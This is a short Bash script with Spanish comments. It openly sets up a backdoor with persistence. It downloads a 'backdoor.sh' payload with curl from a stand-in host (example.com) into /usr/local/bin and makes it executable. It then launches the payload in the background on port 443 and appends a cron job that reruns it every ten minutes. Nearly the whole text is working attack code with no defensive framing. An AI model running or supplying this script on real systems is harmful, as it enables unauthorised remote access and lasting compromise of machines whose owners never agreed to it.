#!/bin/bash

# Función para instalar un backdoor (simulado con Netcat)
install_backdoor() {
  BACKDOOR_URL="http://example.com/backdoor.sh"
  BACKDOOR_PATH="/usr/local/bin/backdoor.sh"

  echo "[+] Descargando e instalando backdoor..."
  curl -o $BACKDOOR_PATH $BACKDOOR_URL
  chmod +x $BACKDOOR_PATH

  # Ejecutar el backdoor en el puerto 443
  echo "[+] Ejecutando backdoor en puerto 443..."
  nohup $BACKDOOR_PATH 443 &
}

# Función para configurar una tarea cron que ejecute el backdoor periódicamente
setup_cronjob() {
  CRONJOB="*/10 * * * * /usr/local/bin/backdoor.sh 443"

  echo "[+] Configurando tarea cron para persistencia..."
  (crontab -l ; echo "$CRONJOB") | crontab -
}

# Ejecutar funciones
install_backdoor
setup_cronjob

echo "[+] Persistencia configurada con backdoor y tarea cron."
